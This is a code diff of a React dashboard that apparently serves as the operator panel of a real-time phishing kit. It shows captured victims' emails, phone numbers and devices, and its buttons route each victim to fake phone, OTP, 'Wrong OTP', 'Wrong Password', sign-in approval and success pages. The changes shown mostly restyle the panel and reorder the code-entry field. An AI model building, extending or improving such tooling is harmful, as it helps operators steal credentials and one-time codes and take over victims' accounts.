@@ -855,50 +855,95 @@ const handlePhoneOtp2Submitted = (data) => {
                       cursor: user.email
                         ? "pointer"
                         : "default"
+                        
     }}>
+                    email: &nbsp;&nbsp;&nbsp;
                    {copiedField === "email"
                      ? "✓ Copied!"
                     : user.email || "Not submitted"}
                   </div>
 
-                  <p style={styles.id}>
+                  {/* <p style={styles.id}>
                     Current Status: {user.status}
-                  </p>
+                  </p> */}
+                  
+                    <div className="kim">
+                      
+                     {user.createdAt && (
+                          <button
+                            className="detail-button os" 
+                            type="button"
+                          >
+                            <span className="detail-label ">
+                              🕐:
+                            </span>{" "}
+
+                            <span className="detail-value">
+                              {timeAgo(user.createdAt)}
+                            </span>
+                          </button>
+                        )}
+                          {user.createdAt && (
+                          <button
+                            className="detail-button op" 
+                            type="button"
+                          >
+                            <span className="detail-label ">
+                              Routed to:
+                            </span>{" "}
+
+                            <span className="detail-value op">
+                             {user.currentStep} page
+                            </span>
+                          </button>
+                        )}
+                        {user.device && user.browser && (
+                    <button
+                      className="device-browser-button"
+                      onClick={() =>
+                        copyField(
+                          "device-browser",
+                          `${user.device} / ${user.browser}`
+                        )
+                      }
+                    >
+                      {copiedField === "device-browser" ? (
+                        <span className="detail-copied">
+                          ✓ Copied!
+                        </span>
+                      ) : (
+                        <>
+                          <span className="detail-value">
+                            {user.device}
+                          </span>
+
+                          <span className="detail-label">
+                            /
+                          </span>
+
+                          <span className="detail-value">
+                            {user.browser}
+                          </span>
+                        </>
+                      )}
+                    </button>
+                  )}
 
                 </div>
+                
 
 
-              <button
-                onClick={() => toggleUserInfo(user._id)}
-                style={{
-                  width: "80px",
-                  border: "1px solid #191b1f",
-                  background: "#465380",
-                  color: "#fbfbfc",
-                  padding: "10px",
-                  borderRadius: "6px",
-                  fontSize: "14px",
-                  fontWeight: "500",
-                  cursor: "pointer",
-                  marginBottom: "12px"
-                }}
-              >
-                {expandedUsers[user._id]
-                  ? "▲ Hide "
-                  : "▼ Show "}
-              </button>
 
+              </div>
               </div>
 
 
               {/* ======================
                   STATUS
               ======================= */}
-              {expandedUsers[user._id] && (
                                 <div style={styles.info}>
 
   {/* Password - don't expose/copy sensitive credentials */}
-        {expandedUsers[user._id] && (
   <div className="user-details">
 
     {user.phoneNumber && (
@@ -1013,37 +1058,7 @@ const handlePhoneOtp2Submitted = (data) => {
     )}
 
 
-    {user.device && user.browser && (
-      <button
-        className="device-browser-button"
-        onClick={() =>
-          copyField(
-            "device-browser",
-            `${user.device} / ${user.browser}`
-          )
-        }
-      >
-        {copiedField === "device-browser" ? (
-          <span className="detail-copied">
-            ✓ Copied!
-          </span>
-        ) : (
-          <>
-            <span className="detail-value">
-              {user.device}
-            </span>
-
-            <span className="detail-label">
-              /
-            </span>
-
-            <span className="detail-value">
-              {user.browser}
-            </span>
-          </>
-        )}
-      </button>
-    )}
+    
 
 
     {user.device && !user.browser && (
@@ -1094,27 +1109,14 @@ const handlePhoneOtp2Submitted = (data) => {
     )}
 
 
-   {user.createdAt && (
-  <button
-    className="detail-button"
-    type="button"
-  >
-    <span className="detail-label">
-      Created:
-    </span>{" "}
 
-    <span className="detail-value">
-      {timeAgo(user.createdAt)}
-    </span>
-  </button>
-)}
 
   </div>
-)}
+
 
 </div>
 
-              )}
+            
 
 
 
@@ -1129,86 +1131,108 @@ const handlePhoneOtp2Submitted = (data) => {
               ======================= */}
 
               <div style={styles.controlsTitle}>
-                User Screen
+                Route this user:
               </div>
 
 
               <div style={styles.controls}>
 
-                <button
-                  onClick={() =>
-                    changeUserStep(
-                      user._id,
-                      "phone"
-                    )
-                  }
-                  style={styles.controlButton}
-                >
-                  Phone Number
-                </button>
+  <button
+    onClick={() =>
+      changeUserStep(user._id, "phone")
+    }
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "phone"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Phone Number
+  </button>
 
 
-                <button
-                  onClick={() => {
-                  setSelectedUser(user);
-                  setUserDevice("");
-                  setCode("");
-                  setShowApproveModal(true);
-                }}
-                  style={styles.controlButton}
-                >
-                  Sign-in Request
-                </button>
+  <button
+    onClick={() => {
+      setSelectedUser(user);
+      setUserDevice("");
+      setCode("");
+      setShowApproveModal(true);
+    }}
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "approve"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Sign-in Request
+  </button>
 
 
-                <button
-                  onClick={() =>
-                    changeUserStep(
-                      user._id,
-                      "phone-otp"
-                    )
-                  }
-                  style={styles.controlButton}
-                >
-                  Phone OTP
-                </button>
-                <button
-                  onClick={() =>
-                    changeUserStep(
-                      user._id,
-                      "phone-otp2"
-                    )
-                  }
-                  style={styles.controlButton}
-                >
-                  Wrong OTP
-                </button>
-                   <button
-                  onClick={() =>
-                    changeUserStep(
-                      user._id,
-                      "wrong-password"
-                    )
-                  }
-                  style={styles.controlButton}
-                >
-                  Wrong Password
-                </button>
+  <button
+    onClick={() =>
+      changeUserStep(user._id, "phone-otp")
+    }
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "phone-otp"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Phone OTP
+  </button>
 
 
-                <button
-                  onClick={() =>
-                    changeUserStep(
-                      user._id,
-                      "success"
-                    )
-                  }
-                  style={styles.successButton}
-                >
-                  Success
-                </button>
+  <button
+    onClick={() =>
+      changeUserStep(user._id, "phone-otp2")
+    }
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "phone-otp2"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Wrong OTP
+  </button>
 
-              </div>
+
+  <button
+    onClick={() =>
+      changeUserStep(
+        user._id,
+        "wrong-password"
+      )
+    }
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "wrong-password"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Wrong Password
+  </button>
+
+
+  <button
+    onClick={() =>
+      changeUserStep(user._id, "success")
+    }
+    style={{
+      ...styles.controlButton,
+      ...(user.currentStep === "success"
+        ? styles.activeControlButton
+        : {})
+    }}
+  >
+    Success
+  </button>
+
+</div>
 
             </div>
 
@@ -1240,6 +1264,24 @@ const handlePhoneOtp2Submitted = (data) => {
         </p>
       )}
 
+      
+      <div className="approve-field">
+
+        <label>
+          Code
+        </label>
+
+        <input
+          type="text"
+          value={code}
+          onChange={(e) =>
+            setCode(e.target.value)
+          }
+          placeholder="Enter Code"
+        />
+
+      </div>
+
       <div className="approve-field">
 
         <label>
@@ -1257,22 +1299,6 @@ const handlePhoneOtp2Submitted = (data) => {
 
       </div>
 
-      <div className="approve-field">
-
-        <label>
-          Code
-        </label>
-
-        <input
-          type="text"
-          value={code}
-          onChange={(e) =>
-            setCode(e.target.value)
-          }
-          placeholder="Enter Code"
-        />
-
-      </div>
 
       <div className="approve-modal-actions">
 
@@ -1312,7 +1338,7 @@ const handlePhoneOtp2Submitted = (data) => {
            
 
               setShowApproveModal(false);
-              setSelectedUser(null);
+              // setSelectedUser(null);
 
             } catch (error) {
 
@@ -1392,6 +1418,14 @@ const styles = {
     fontWeight: "600",
     color: "#ffffff"
   },
+  activeControlButton: {
+  // border: "1px solid #1a73e8",
+  background: "#1a73e8",
+  // color: "#fff",
+  // fontWeight: "600"
+},
+
+
 
   subtitle: {
     marginTop: "8px",
@@ -1494,8 +1528,6 @@ const styles = {
   },
 
   info: {
-    borderTop: "1px solid #243756",
-    borderBottom: "1px solid #243756",
     padding: "10px 0",
     marginBottom: "15px"
   },
@@ -1542,17 +1574,17 @@ const styles = {
   },
 
   controls: {
-    display: "grid",
-    gridTemplateColumns: "1fr 1fr",
-    gap: "8px"
+    display: "flex",
+    flexWrap: "wrap",
+    gap: "12px"
   },
 
   controlButton: {
     border: "1px solid #304665",
     background: "#17243a",
     color: "#c9d8ee",
-    padding: "10px 8px",
-    borderRadius: "7px",
+    padding: "10px 20px",
+    borderRadius: "17px",
     fontSize: "13px",
     cursor: "pointer",
     fontWeight: "500"
@@ -1562,8 +1594,8 @@ const styles = {
     border: "none",
     background: "#16803c",
     color: "#ffffff",
-    padding: "10px 8px",
-    borderRadius: "7px",
+    padding: "10px 20px",
+    borderRadius: "17px",
     fontSize: "13px",
     cursor: "pointer",
     fontWeight: "500"
